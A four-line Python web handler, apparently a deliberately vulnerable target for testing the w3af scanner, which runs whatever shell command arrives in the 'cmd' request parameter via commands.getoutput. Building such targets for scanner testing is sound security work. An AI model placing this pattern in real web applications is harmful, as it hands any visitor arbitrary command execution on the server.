import commands

def index(req, cmd='echo "w3' + 'af"' ):
    return commands.getoutput( cmd )
